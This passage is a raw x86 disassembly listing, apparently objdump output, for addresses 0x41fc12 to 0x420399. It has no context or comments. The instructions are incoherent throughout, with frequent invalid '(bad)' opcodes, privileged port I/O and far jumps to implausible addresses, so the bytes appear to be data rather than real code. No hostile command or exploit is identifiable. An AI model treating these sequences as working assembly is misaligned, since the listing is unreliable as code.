  41fc12:	fisttp DWORD PTR [eax+0x539e7a01]
  41fc18:	test   al,0x15
  41fc1a:	push   esp
  41fc1b:	xlat   BYTE PTR ds:[ebx]
  41fc1c:	inc    ebx
  41fc1d:	mov    bh,0x7d
  41fc1f:	jp     0x41fc51
  41fc21:	pop    edi
  41fc22:	jp     0x41fc9e
  41fc24:	jnp    0x41fbcc
  41fc26:	sub    DWORD PTR [edi-0x2d855a56],esi
  41fc2c:	pushf  
  41fc2d:	clc    
  41fc2e:	aas    
  41fc2f:	int3   
  41fc30:	lock mov bl,0x29
  41fc33:	btr    ebx,ebp
  41fc36:	fsubrp st(6),st
  41fc38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc39:	adc    ch,BYTE PTR [esi-0x3ef237e0]
  41fc3f:	or     ch,BYTE PTR [edx+0x3897473f]
  41fc45:	pop    ecx
  41fc46:	mov    ebp,DWORD PTR [ecx]
  41fc48:	in     eax,dx
  41fc49:	sbb    edi,DWORD PTR [ecx-0x48]
  41fc4c:	inc    ecx
  41fc4d:	sar    BYTE PTR [ebp-0x3a50cc25],0x10
  41fc54:	scas   eax,DWORD PTR es:[edi]
  41fc55:	pop    ebx
  41fc56:	aas    
  41fc57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc58:	fisttp WORD PTR [ebp-0x791d19bb]
  41fc5e:	test   edx,0x50e9ec52
  41fc64:	(bad)  
  41fc65:	out    dx,al
  41fc66:	arpl   WORD PTR [ebx+ebx*4],bp
  41fc69:	sub    BYTE PTR fs:[ebp+0x6eeb4a77],ch
  41fc70:	xor    ah,BYTE PTR [ebp-0x5f]
  41fc73:	jo     0x41fc1d
  41fc75:	mov    ds:0x90ba1a95,al
  41fc7a:	xchg   edi,eax
  41fc7b:	dec    esp
  41fc7c:	mov    WORD PTR [esi-0x7c],ss
  41fc7f:	(bad)  
  41fc80:	mov    edx,edi
  41fc82:	and    ah,bl
  41fc84:	clc    
  41fc85:	jns    0x41fc67
  41fc87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc88:	scas   eax,DWORD PTR es:[edi]
  41fc89:	sub    eax,0xf044a0ed
  41fc8e:	das    
  41fc8f:	test   DWORD PTR [ebx+eax*1-0x6c],0x173b8555
  41fc97:	xchg   ecx,eax
  41fc98:	sub    al,0x6d
  41fc9a:	test   dl,ah
  41fc9c:	inc    edx
  41fc9d:	adc    al,0x94
  41fc9f:	sbb    al,bh
  41fca1:	stos   DWORD PTR es:[edi],eax
  41fca2:	jo     0x41fc3e
  41fca4:	in     al,0x93
  41fca6:	pop    edx
  41fca7:	inc    esp
  41fca8:	add    DWORD PTR [ecx-0x19],eax
  41fcab:	inc    ebp
  41fcac:	sub    esp,edi
  41fcae:	push   esi
  41fcaf:	sbb    eax,0x2dbec461
  41fcb4:	pop    esp
  41fcb5:	xor    DWORD PTR [ecx],edx
  41fcb7:	test   BYTE PTR [edi],bh
  41fcb9:	xchg   ebp,eax
  41fcba:	stos   BYTE PTR es:[edi],al
  41fcbb:	jo     0x41fce5
  41fcbd:	int3   
  41fcbe:	cmp    BYTE PTR [edx+0x16532594],dh
  41fcc4:	ror    DWORD PTR [ebx+0x47eba0a6],1
  41fcca:	or     BYTE PTR [ebp-0x2946cca2],bl
  41fcd0:	mov    al,ds:0x5f044742
  41fcd5:	push   ss
  41fcd6:	sahf   
  41fcd7:	inc    esp
  41fcd8:	js     0x41fd26
  41fcda:	popf   
  41fcdb:	lods   eax,DWORD PTR ds:[esi]
  41fcdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fcdd:	pop    ebx
  41fcde:	jo     0x41fce4
  41fce0:	lds    eax,FWORD PTR ds:0x5d8d583e
  41fce6:	push   ecx
  41fce7:	not    BYTE PTR [ecx+0x44]
  41fcea:	push   cs
  41fceb:	aam    0x83
  41fced:	test   eax,0x70105267
  41fcf2:	mov    bl,0x54
  41fcf4:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41fcf6:	fs in  eax,0x46
  41fcf9:	xor    al,BYTE PTR [esi+ecx*2]
  41fcfc:	repz or eax,0xc4ce3f6b
  41fd02:	fcomp  DWORD PTR [esi]
  41fd04:	dec    ecx
  41fd05:	scas   eax,DWORD PTR es:[edi]
  41fd06:	ins    BYTE PTR es:[edi],dx
  41fd07:	dec    esi
  41fd08:	shl    BYTE PTR ds:0x665090cf,1
  41fd0e:	fwait
  41fd0f:	loop   0x41fd14
  41fd11:	aaa    
  41fd12:	mov    bl,0x6c
  41fd14:	adc    al,0x2e
  41fd16:	push   0x1d5dfa98
  41fd1b:	nop
  41fd1c:	inc    eax
  41fd1d:	clc    
  41fd1e:	and    al,0xb9
  41fd20:	sti    
  41fd21:	imul   ecx,DWORD PTR [ebx],0x9beb61eb
  41fd27:	(bad)  
  41fd28:	ins    DWORD PTR es:[edi],dx
  41fd29:	fmul   st(3),st
  41fd2b:	push   ds
  41fd2c:	pop    ecx
  41fd2d:	add    eax,0x8147e2ef
  41fd32:	daa    
  41fd33:	js     0x41fcbf
  41fd35:	adc    DWORD PTR [edi+0x7871cbdf],eax
  41fd3b:	rcl    DWORD PTR [ecx+ebp*8-0x44],0x20
  41fd40:	fsub   QWORD PTR [ebp+0x403cc924]
  41fd46:	and    ebp,ebx
  41fd48:	push   ebp
  41fd49:	push   ss
  41fd4a:	inc    DWORD PTR [ebx-0xe]
  41fd4d:	mov    ecx,0xb1d9e107
  41fd52:	pop    ds
  41fd53:	push   esi
  41fd54:	dec    esp
  41fd55:	and    al,0xca
  41fd57:	stc    
  41fd58:	xchg   ebx,eax
  41fd59:	mov    ebp,ebx
  41fd5b:	xor    cl,al
  41fd5d:	dec    ebp
  41fd5e:	pop    ecx
  41fd5f:	inc    ecx
  41fd60:	popa   
  41fd61:	jl     0x41fda2
  41fd63:	dec    edx
  41fd64:	daa    
  41fd65:	aad    0x1c
  41fd67:	cwde   
  41fd68:	add    DWORD PTR [esi+esi*2],0xffffffb9
  41fd6c:	dec    ebp
  41fd6d:	mov    eax,0xc76b78e
  41fd72:	add    cl,0xe2
  41fd75:	mov    ebx,0x8e7caf4e
  41fd7a:	mov    dh,0x85
  41fd7c:	jle    0x41fdbd
  41fd7e:	add    edi,DWORD PTR [ebx+edi*1+0x86d3dbc]
  41fd85:	xor    BYTE PTR [ecx-0x4622268d],dl
  41fd8b:	sub    DWORD PTR [eax+eax*2-0x5105280c],ecx
  41fd92:	inc    eax
  41fd93:	fwait
  41fd94:	addr16 in al,0x57
  41fd97:	jae    0x41fdb5
  41fd99:	mov    esp,DWORD PTR [edi+0x6d]
  41fd9c:	xor    BYTE PTR [ebx],0x15
  41fd9f:	leave  
  41fda0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fda1:	xor    al,BYTE PTR [edi]
  41fda3:	and    DWORD PTR [ecx-0x2a41ea59],ebx
  41fda9:	in     eax,0x11
  41fdab:	fiadd  WORD PTR [eax+0x2a]
  41fdae:	aad    0x86
  41fdb0:	jo     0x41fe1d
  41fdb2:	retf   
  41fdb3:	cmp    BYTE PTR [edi+eax*2],dh
  41fdb6:	into   
  41fdb7:	sbb    eax,0x76aab056
  41fdbc:	sti    
  41fdbd:	push   ss
  41fdbe:	and    al,0xcf
  41fdc0:	mov    al,0xd4
  41fdc2:	stc    
  41fdc3:	xchg   esp,eax
  41fdc4:	or     al,0xcc
  41fdc6:	xchg   esp,eax
  41fdc7:	(bad)  
  41fdc8:	fistp  QWORD PTR [eax]
  41fdca:	jnp    0x41fdb9
  41fdcc:	push   esp
  41fdcd:	jge    0x41fe3b
  41fdcf:	fild   QWORD PTR es:[ebx-0x2e5e3490]
  41fdd6:	pop    ds
  41fdd7:	in     eax,0xe0
  41fdd9:	mov    ch,BYTE PTR [eax+0x5f]
  41fddc:	loop   0x41fdd2
  41fdde:	jbe    0x41fd8c
  41fde0:	inc    ecx
  41fde1:	rcl    BYTE PTR [esi-0x3634eef7],1
  41fde7:	jp     0x41fdfb
  41fde9:	ret    
  41fdea:	push   bx
  41fdec:	adc    DWORD PTR [ecx+eiz*4],0x462b801d
  41fdf3:	retf   0xe7cb
  41fdf6:	or     ecx,ebx
  41fdf8:	pop    edi
  41fdf9:	cmp    DWORD PTR [ebp+0x70],edi
  41fdfc:	mov    cl,0xfb
  41fdfe:	sub    al,ah
  41fe00:	loope  0x41fdef
  41fe02:	xor    ah,bl
  41fe04:	xor    BYTE PTR fs:[ebx+0x49fac56a],al
  41fe0b:	mov    BYTE PTR ds:0xc39eb53,dl
  41fe11:	xchg   edx,eax
  41fe12:	push   ss
  41fe13:	add    DWORD PTR [ecx+0x75f7a4ba],esp
  41fe19:	add    bh,BYTE PTR [edi+ebx*4]
  41fe1c:	loopne 0x41fe2d
  41fe1e:	imul   eax,DWORD PTR [ecx],0xecd74ccd
  41fe24:	sbb    DWORD PTR [edx+0x59],0xffffffb4
  41fe28:	adc    BYTE PTR [eax-0x43],dl
  41fe2b:	jb     0x41fdca
  41fe2d:	sbb    al,0xf3
  41fe2f:	mov    esi,DWORD PTR [edi+ebp*4]
  41fe32:	les    esp,FWORD PTR [ebx-0x80]
  41fe35:	mov    cs,edi
  41fe37:	in     al,0x8b
  41fe39:	ret    
  41fe3a:	retf   0xd527
  41fe3d:	ins    DWORD PTR es:[edi],dx
  41fe3e:	pop    ds
  41fe3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe40:	or     WORD PTR [eax-0x1e],si
  41fe44:	mov    dh,0x45
  41fe46:	loopne 0x41fdc8
  41fe48:	inc    ebx
  41fe49:	ret    
  41fe4a:	cmp    eax,0x96d0fe92
  41fe4f:	push   0xc91221f7
  41fe54:	test   BYTE PTR [esp+edx*4-0x3e],dl
  41fe58:	call   0x40d1:0x61eeaeaf
  41fe5f:	adc    BYTE PTR [edx-0x77],0xfe
  41fe63:	mov    bl,0xd8
  41fe65:	and    eax,0x49f20965
  41fe6a:	iret   
  41fe6b:	sbb    DWORD PTR [edi-0x5f],ebx
  41fe6e:	mov    ecx,0xa8ac6ced
  41fe73:	icebp  
  41fe74:	ss jge 0x41fea8
  41fe77:	add    al,0x80
  41fe79:	xlat   BYTE PTR ds:[ebx]
  41fe7a:	and    bl,BYTE PTR [ebx]
  41fe7c:	ds scas eax,DWORD PTR es:[edi]
  41fe7e:	or     ecx,DWORD PTR cs:[ebp-0x67435e00]
  41fe85:	or     DWORD PTR [esi-0x3859d1f4],edx
  41fe8b:	leave  
  41fe8c:	ins    DWORD PTR es:[edi],dx
  41fe8d:	sub    BYTE PTR [ecx+0x34],bl
  41fe90:	outs   dx,BYTE PTR ds:[esi]
  41fe91:	stc    
  41fe92:	jg     0x41fed3
  41fe94:	sub    bl,0x24
  41fe97:	in     al,0x41
  41fe99:	push   cs
  41fe9a:	fcomp  QWORD PTR [edi+0x126ecab2]
  41fea0:	xchg   ecx,eax
  41fea1:	aam    0x17
  41fea3:	in     al,dx
  41fea4:	jge    0x41fe44
  41fea6:	clc    
  41fea7:	into   
  41fea8:	dec    edx
  41fea9:	shr    BYTE PTR [eax+ebx*2+0x33],1
  41fead:	lahf   
  41feae:	(bad)  
  41feaf:	(bad)  
  41feb0:	jno    0x41feeb
  41feb2:	shl    BYTE PTR [edx+0x7e],cl
  41feb5:	outs   dx,BYTE PTR ds:[esi]
  41feb6:	adc    edi,eax
  41feb8:	cs dec edi
  41feba:	xchg   esi,eax
  41febb:	addr16 (bad) 
  41febd:	xchg   ebx,eax
  41febe:	mov    ebx,edi
  41fec0:	out    dx,al
  41fec1:	sar    bh,0xfa
  41fec4:	cli    
  41fec5:	xchg   esi,eax
  41fec6:	sub    eax,0x61d69c8
  41fecb:	adc    edx,edi
  41fecd:	(bad)  
  41fece:	hlt    
  41fecf:	icebp  
  41fed0:	add    ch,dl
  41fed2:	fst    DWORD PTR [edx-0x560aec6e]
  41fed8:	out    dx,al
  41fed9:	loop   0x41fe84
  41fedb:	int3   
  41fedc:	inc    edx
  41fedd:	pop    ds
  41fede:	dec    esp
  41fedf:	cmp    ah,cl
  41fee1:	call   0xd8a3039c
  41fee6:	fmul   QWORD PTR [ebp-0x46]
  41fee9:	inc    esi
  41feea:	mov    bl,0x65
  41feec:	mov    BYTE PTR [ebx-0x5ceefb90],dl
  41fef2:	repnz stos BYTE PTR es:[edi],al
  41fef4:	cdq    
  41fef5:	cmp    eax,0xf41d7621
  41fefa:	mov    dl,0x1a
  41fefc:	les    ebx,FWORD PTR [edx+0xb14a3a4]
  41ff02:	je     0x41ff49
  41ff04:	or     eax,esi
  41ff06:	cmc    
  41ff07:	dec    ecx
  41ff08:	sbb    DWORD PTR [edi-0x37],0x2d
  41ff0c:	imul   ebp,DWORD PTR [edi+0x35],0xb4842be3
  41ff13:	inc    DWORD PTR [ebx-0x6c51f379]
  41ff19:	sub    bl,0x3c
  41ff1c:	(bad)  
  41ff1d:	mov    cl,0x8d
  41ff1f:	lods   al,BYTE PTR ds:[esi]
  41ff20:	sub    eax,0xe049b00f
  41ff25:	add    ebx,DWORD PTR [ecx+0x1d4dfd4d]
  41ff2b:	or     BYTE PTR [eax],cl
  41ff2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff2e:	xchg   ebx,eax
  41ff2f:	cmp    DWORD PTR [esi+eiz*4+0x49],edx
  41ff33:	and    eax,0xb0e4ab69
  41ff38:	push   eax
  41ff39:	mov    ah,BYTE PTR [ecx-0x73a8befc]
  41ff3f:	ret    0x38f8
  41ff42:	popa   
  41ff43:	pop    edx
  41ff44:	icebp  
  41ff45:	nop
  41ff46:	cli    
  41ff47:	push   es
  41ff48:	mov    edi,0xde06207b
  41ff4d:	push   eax
  41ff4e:	mov    edx,0xac28d3e5
  41ff53:	fs dec ebx
  41ff55:	dec    edi
  41ff56:	(bad)  
  41ff57:	das    
  41ff58:	adc    edx,eax
  41ff5a:	sbb    DWORD PTR [ecx-0x74],0xffffff82
  41ff5e:	in     eax,dx
  41ff5f:	into   
  41ff60:	cmp    al,0xd8
  41ff62:	or     al,BYTE PTR [edx+0x47deee1c]
  41ff68:	mov    ebx,0xc451632c
  41ff6d:	sub    ch,ah
  41ff6f:	repz std 
  41ff71:	data16 arpl bx,bx
  41ff74:	mov    ds:0x645f01ca,al
  41ff79:	pop    ds
  41ff7a:	stc    
  41ff7b:	loope  0x41ffd3
  41ff7d:	shl    BYTE PTR [ebp-0x16],0x61
  41ff81:	adc    dl,0x9b
  41ff84:	jb     0x41ff61
  41ff86:	inc    esp
  41ff87:	mov    ch,0xf7
  41ff89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff8a:	ins    DWORD PTR es:[edi],dx
  41ff8b:	and    WORD PTR [ecx-0x1797454a],bp
  41ff92:	enter  0x751f,0xcd
  41ff96:	std    
  41ff97:	(bad)  
  41ff98:	js     0x420003
  41ff9a:	int3   
  41ff9b:	sub    dl,dl
  41ff9d:	and    eax,0xfa053ba6
  41ffa2:	mov    esi,0xda497290
  41ffa7:	and    bl,dh
  41ffa9:	mov    ds:0x247e17fa,eax
  41ffae:	xor    al,0xc6
  41ffb0:	add    BYTE PTR [edx-0x720c25ff],dl
  41ffb6:	or     eax,0x18234b88
  41ffbb:	pusha  
  41ffbc:	push   ebp
  41ffbd:	push   edx
  41ffbe:	mov    al,0x2f
  41ffc0:	ret    
  41ffc1:	sti    
  41ffc2:	aad    0x36
  41ffc4:	and    eax,0x5689596d
  41ffc9:	fist   DWORD PTR [edi-0x4891ee56]
  41ffcf:	in     eax,dx
  41ffd0:	stos   BYTE PTR es:[edi],al
  41ffd1:	fistp  DWORD PTR [esi-0x7baac240]
  41ffd7:	mov    edi,0xed09da37
  41ffdc:	pop    edx
  41ffdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ffde:	fadd   QWORD PTR [edi-0x5a9646dd]
  41ffe4:	push   eax
  41ffe5:	push   ebx
  41ffe6:	pop    ebp
  41ffe7:	js     0x41ff79
  41ffe9:	cli    
  41ffea:	fs xchg ecx,eax
  41ffec:	pushf  
  41ffed:	dec    ecx
  41ffee:	inc    ecx
  41ffef:	mov    bl,0x58
  41fff1:	or     ebx,edx
  41fff3:	jp     0x42004d
  41fff5:	xchg   ecx,eax
  41fff6:	dec    ebx
  41fff7:	and    esp,DWORD PTR [ebx+0x70]
  41fffa:	iret   
  41fffb:	(bad)  
  41fffc:	xlat   BYTE PTR ds:[ebx]
  41fffd:	mov    dl,0x15
  41ffff:	jns    0x420013
  420001:	mov    edi,0x12084830
  420006:	jne    0x41ffc2
  420008:	ds clc 
  42000a:	aad    0xac
  42000c:	sti    
  42000d:	jl     0x420037
  42000f:	pop    edx
  420010:	neg    DWORD PTR [ebp+ebx*2-0x7b44013f]
  420017:	retf   0xe223
  42001a:	pop    ecx
  42001b:	mov    ds:0x62d5a252,eax
  420020:	mov    dh,0x75
  420022:	rcr    BYTE PTR [edi-0x54b90ef],cl
  420028:	xchg   edi,eax
  420029:	ror    DWORD PTR [esi+edi*8-0x2b495808],1
  420030:	mov    esp,DWORD PTR [edx-0x3c]
  420033:	xor    eax,0x183e3cac
  420038:	push   ds
  420039:	sbb    edi,ebx
  42003b:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  42003d:	mov    edi,0x855f46df
  420042:	xchg   edx,eax
  420043:	rdmsr  
  420045:	and    DWORD PTR [ecx+ebx*1],edi
  420048:	ins    DWORD PTR es:[edi],dx
  420049:	lods   eax,DWORD PTR ds:[esi]
  42004a:	and    DWORD PTR [edi+ecx*8],esp
  42004d:	dec    eax
  42004e:	inc    edx
  42004f:	retf   0x5ea2
  420052:	mov    ds,WORD PTR [edx]
  420054:	call   0x1283:0x69b18ca
  42005b:	sar    BYTE PTR [ecx-0x21],1
  42005e:	mov    eax,0x593039ff
  420063:	sub    DWORD PTR [ebx+0x17],edi
  420066:	push   esi
  420067:	pop    ss
  420068:	xor    al,bl
  42006a:	inc    ebp
  42006b:	lahf   
  42006c:	out    0x7b,al
  42006e:	cs jbe 0x420019
  420071:	sub    ebx,DWORD PTR [eax]
  420073:	push   cs
  420074:	inc    esi
  420075:	jb     0x4200f5
  420077:	ret    0xb24b
  42007a:	jbe    0x42006d
  42007c:	je     0x420021
  42007e:	hlt    
  42007f:	inc    esp
  420080:	pop    ecx
  420081:	lea    edi,[edx-0x6c7d96e9]
  420087:	or     esp,esi
  420089:	je     0x420088
  42008b:	arpl   WORD PTR [esi+ebx*1+0x42],sp
  42008f:	dec    ecx
  420090:	add    dl,BYTE PTR [eax-0x2d2ed3f1]
  420096:	pop    es
  420097:	shr    DWORD PTR gs:[ecx],0xe1
  42009b:	out    0xe9,al
  42009d:	ja     0x420029
  42009f:	test   BYTE PTR [ebp-0x5056c01d],cl
  4200a5:	cmp    eax,0x404c4c02
  4200aa:	stos   DWORD PTR es:[edi],eax
  4200ab:	pop    esi
  4200ac:	xchg   esi,eax
  4200ad:	imul   eax
  4200af:	sub    eax,0x30680cf6
  4200b4:	or     al,0x4f
  4200b6:	jns    0x42011c
  4200b8:	mov    al,ds:0x2f5fecb9
  4200bd:	sub    DWORD PTR gs:[esi+0x10],ecx
  4200c1:	mov    bl,0x63
  4200c3:	gs add al,0xaa
  4200c6:	or     al,0xa1
  4200c8:	adc    BYTE PTR [eax],ch
  4200ca:	repz pushf 
  4200cc:	(bad)  
  4200cd:	(bad)  [edi]
  4200cf:	repnz inc edi
  4200d1:	or     BYTE PTR [eax-0x4c],al
  4200d4:	xor    BYTE PTR [ecx+0x5d7b965b],0xe0
  4200db:	test   BYTE PTR [edi+esi*1+0x6a],0x25
  4200e0:	dec    DWORD PTR ds:0xffc25044
  4200e6:	pop    edi
  4200e7:	add    al,0xf7
  4200e9:	clc    
  4200ea:	sbb    ebx,esi
  4200ec:	mov    WORD PTR [ebx+esi*1-0x6fd4e6f5],ss
  4200f3:	adc    al,0x28
  4200f5:	xlat   BYTE PTR ds:[ebx]
  4200f6:	pushf  
  4200f7:	int3   
  4200f8:	mov    edi,0x3e6d7698
  4200fd:	stos   DWORD PTR es:[edi],eax
  4200fe:	add    cl,BYTE PTR [esi-0x45]
  420101:	push   esi
  420102:	push   eax
  420103:	test   DWORD PTR [edx],edx
  420105:	pushf  
  420106:	ss jmp 0x4200a7
  420109:	fadd   QWORD PTR [esi+0x7a843396]
  42010f:	js     0x420145
  420111:	jp     0x420095
  420113:	cmp    edi,ebx
  420115:	std    
  420116:	adc    eax,0xe9bb4c66
  42011b:	pop    edx
  42011c:	ret    
  42011d:	arpl   di,si
  42011f:	xor    dl,BYTE PTR [eax]
  420121:	les    ecx,FWORD PTR [edi+0x2a381bb7]
  420127:	es push esp
  420129:	fidivr WORD PTR [ebp+eiz*8-0x4a42124e]
  420130:	inc    ebp
  420131:	jecxz  0x420161
  420133:	out    0x6e,al
  420135:	jb     0x420111
  420137:	push   ecx
  420138:	inc    ebx
  420139:	xor    eax,0x85e74d89
  42013e:	dec    ecx
  42013f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420141:	dec    esi
  420142:	cld    
  420143:	not    BYTE PTR [eax+0xdbcc7e4]
  420149:	imul   eax,esp,0xb0993d15
  42014f:	push   ebp
  420150:	jo     0x4201c9
  420152:	inc    edi
  420153:	push   eax
  420154:	and    ecx,DWORD PTR [edx+ebx*2-0x1d]
  420158:	push   edi
  420159:	push   cs
  42015a:	popf   
  42015b:	jns    0x42013e
  42015d:	scas   eax,DWORD PTR es:[edi]
  42015e:	or     DWORD PTR [ebx],ecx
  420160:	leave  
  420161:	and    eax,0x7094f3c6
  420166:	mov    ch,0xd9
  420168:	mov    esp,0xdab1cc14
  42016d:	mov    bl,0x69
  42016f:	data16 int 0xf1
  420172:	inc    eax
  420173:	loopne 0x42015b
  420175:	scas   eax,DWORD PTR es:[edi]
  420176:	ret    
  420177:	or     al,0x9f
  420179:	dec    esp
  42017a:	into   
  42017b:	sub    BYTE PTR [ebx-0x1],dh
  42017e:	pop    edx
  42017f:	leave  
  420180:	xor    ch,BYTE PTR [edi+0x2f]
  420183:	xor    DWORD PTR [ecx],0x44
  420186:	cmc    
  420187:	inc    esi
  420188:	jne    0x420159
  42018a:	ja     0x4201dd
  42018c:	xchg   ebp,eax
  42018d:	or     BYTE PTR [ebx+0x3f],bl
  420190:	jnp    0x420162
  420192:	enter  0xb9e7,0x80
  420196:	jo     0x420156
  420198:	cmp    esi,DWORD PTR [ebx+0x622c325e]
  42019e:	idiv   DWORD PTR [ebx]
  4201a0:	cmp    ch,BYTE PTR [ebp+0x94122c7]
  4201a6:	jmp    0xd62e:0x1a91321e
  4201ad:	push   0x1d811b0c
  4201b2:	sahf   
  4201b3:	cli    
  4201b4:	xor    BYTE PTR [edi+0x2f11bed5],ah
  4201ba:	xchg   esp,eax
  4201bb:	pslld  mm1,QWORD PTR [esi]
  4201be:	sub    dl,BYTE PTR [esi]
  4201c0:	scas   al,BYTE PTR es:[edi]
  4201c1:	pop    ds
  4201c2:	adc    cl,bl
  4201c4:	mov    ecx,0x42b9161f
  4201c9:	call   0x335b9bfd
  4201ce:	sti    
  4201cf:	pop    edi
  4201d0:	repnz dec esp
  4201d2:	shufps xmm1,XMMWORD PTR [edi+0x35],0xa8
  4201d7:	cwde   
  4201d8:	xchg   ecx,ebx
  4201da:	push   ebx
  4201db:	jo     0x4201a9
  4201dd:	ja     0x4201e6
  4201df:	lods   eax,DWORD PTR ds:[esi]
  4201e0:	std    
  4201e1:	ret    0x97d9
  4201e4:	in     eax,dx
  4201e5:	cmp    ecx,0xc
  4201e8:	(bad)  [edi-0x26b80303]
  4201ee:	and    al,0x6f
  4201f0:	pop    ebp
  4201f1:	add    DWORD PTR [eax],ecx
  4201f3:	call   0xf3eeb8bb
  4201f8:	enter  0x7466,0x5f
  4201fc:	mov    ah,0x15
  4201fe:	js     0x420215
  420200:	enter  0xc515,0x5a
  420204:	sbb    eax,0xc61fe19d
  420209:	mov    dh,0xdb
  42020b:	ret    0xb73e
  42020e:	stos   BYTE PTR es:[edi],al
  42020f:	jle    0x4201a4
  420211:	scas   eax,DWORD PTR es:[edi]
  420212:	push   esi
  420213:	ins    DWORD PTR es:[edi],dx
  420214:	les    ecx,FWORD PTR [edx+eax*1-0x74c07a62]
  42021b:	dec    edx
  42021c:	mov    ah,0x45
  42021e:	xchg   BYTE PTR [edx-0x3f],dh
  420221:	ss daa 
  420223:	dec    esp
  420224:	dec    ebx
  420225:	sahf   
  420226:	push   esp
  420227:	in     eax,0xce
  420229:	and    BYTE PTR [esi],dh
  42022b:	push   0xd6cddf3e
  420230:	push   es
  420231:	repz mov edx,0xc94b909f
  420237:	add    eax,0x1da17dd3
  42023c:	lahf   
  42023d:	sar    DWORD PTR [edi+eiz*8],1
  420240:	mov    DWORD PTR [esi+0x7a],ebp
  420243:	jne    0x4201d6
  420245:	pop    edi
  420246:	mov    edx,0x1d4857ef
  42024b:	mov    edx,0xcc41a9ee
  420250:	or     BYTE PTR [eax],0x62
  420253:	(bad)
  420256:	pop    ss
  420257:	pop    ebp
  420258:	pop    edi
  420259:	xor    ecx,DWORD PTR [esi-0x4306c1c0]
  42025f:	mov    eax,ds:0xdaae47fd
  420264:	addr16 inc esp
  420266:	bound  ecx,QWORD PTR [edx+0xa96246d]
  42026c:	xchg   ebp,eax
  42026d:	pop    edx
  42026e:	mov    WORD PTR [esi],fs
  420270:	xor    al,0x20
  420272:	rcl    DWORD PTR [ebx+edx*4],0x1a
  420276:	(bad)  
  420277:	mov    edi,0xa19bdf7c
  42027c:	stc    
  42027d:	adc    BYTE PTR [ebp+0x26f6c71f],ch
  420283:	mov    WORD PTR [ebx+0x2e9bd5a9],ds
  420289:	cmp    BYTE PTR [ecx],0x64
  42028c:	pop    edi
  42028d:	ins    BYTE PTR es:[edi],dx
  42028e:	pop    eax
  42028f:	or     eax,0xfb17c31c
  420294:	(bad)  
  420295:	fisubr DWORD PTR [eax+0x64]
  420298:	mov    bl,0xc2
  42029a:	sub    eax,0x9a97825c
  42029f:	jg     0x42031e
  4202a1:	mov    al,0x37
  4202a3:	test   eax,0xd6205b2d
  4202a8:	push   ds
  4202a9:	or     eax,0xc707bb5c
  4202ae:	sub    DWORD PTR [edx-0x5f],edx
  4202b1:	popf   
  4202b2:	imul   esi,DWORD PTR [ebp+0x1c907702],0x25
  4202b9:	push   ecx
  4202ba:	lds    esi,FWORD PTR [edx+0x4c3ebdea]
  4202c0:	push   ss
  4202c1:	test   DWORD PTR [ebp-0x70],eax
  4202c4:	int3   
  4202c5:	retf   0x708d
  4202c8:	jecxz  0x420333
  4202ca:	fmul   QWORD PTR ds:0xc794ee6e
  4202d0:	lods   eax,DWORD PTR ds:[esi]
  4202d1:	and    edi,DWORD PTR [ebx-0x2c]
  4202d4:	dec    edi
  4202d5:	xor    BYTE PTR [eax+0x49],0xfe
  4202d9:	add    eax,0xc5ca52ec
  4202de:	jl     0x420296
  4202e0:	mov    edx,0x216a2bb6
  4202e5:	fisttp WORD PTR [edx+edi*2-0x5565592]
  4202ec:	leave  
  4202ed:	pop    edi
  4202ee:	(bad)  
  4202ef:	fistp  QWORD PTR [eax+0x59912951]
  4202f5:	xor    ch,BYTE PTR [ebx]
  4202f7:	sbb    BYTE PTR [ecx+edx*1],al
  4202fa:	dec    edx
  4202fb:	xchg   DWORD PTR [eax+0x55],eax
  4202fe:	xchg   esi,eax
  4202ff:	mov    ch,0x7e
  420301:	push   es
  420302:	push   ds
  420303:	in     al,0xc0
  420305:	pop    esp
  420307:	enter  0x1be5,0xf9
  42030b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42030c:	mul    DWORD PTR [eax-0x3d]
  42030f:	fsubr  QWORD PTR [edx+ecx*1]
  420312:	sar    BYTE PTR [edx],0x10
  420315:	dec    esi
  420316:	push   esp
  420317:	xor    BYTE PTR [ebp-0xf],ch
  42031a:	push   0x36
  42031c:	stc    
  42031d:	std    
  42031e:	mov    eax,ds:0x93f1e7f
  420323:	pop    ss
  420324:	mov    ds:0x81f7057d,eax
  420329:	sahf   
  42032a:	call   0xa136:0xd9b075a5
  420331:	jp     0x420324
  420333:	mov    WORD PTR [esi],ss
  420335:	iret   
  420336:	dec    edi
  420337:	jmp    0x40c82a3f
  42033c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42033d:	dec    ebx
  42033e:	test   DWORD PTR [ecx+0x5f],esp
  420341:	cld    
  420342:	pop    esi
  420343:	add    al,0x53
  420345:	mov    al,ds:0x54d2b7ec
  42034a:	mov    dh,0x87
  42034c:	mov    ds:0x6bc1a9fb,eax
  420351:	jne    0x42034f
  420353:	xlat   BYTE PTR ds:[ebx]
  420354:	or     DWORD PTR [edi+edx*4-0x2f],edx
  420358:	pop    ss
  420359:	and    eax,0x247f44c8
  42035e:	rol    DWORD PTR [edx],cl
  420360:	in     al,0x6b
  420362:	push   eax
  420363:	push   cs
  420364:	add    al,0x35
  420366:	jae    0x4203a3
  420368:	stos   DWORD PTR es:[edi],eax
  420369:	push   esi
  42036a:	sbb    al,BYTE PTR [eax+0x149f368c]
  420370:	call   0x4fa6:0x60de2001
  420377:	xchg   ebp,eax
  420378:	ss cmp al,0xaa
  42037b:	into   
  42037c:	pop    ss
  42037d:	jnp    0x420363
  42037f:	stos   DWORD PTR es:[edi],eax
  420380:	push   edi
  420381:	ja     0x42039d
  420383:	lods   eax,DWORD PTR ds:[esi]
  420384:	jge    0x4203a9
  420386:	test   eax,0xcd164122
  42038b:	add    edi,DWORD PTR [edi]
  42038d:	ficomp DWORD PTR [ecx+0x2728553f]
  420393:	xor    dh,BYTE PTR [eax+0x79844dd6]
  420399:	push   0xffffffa5
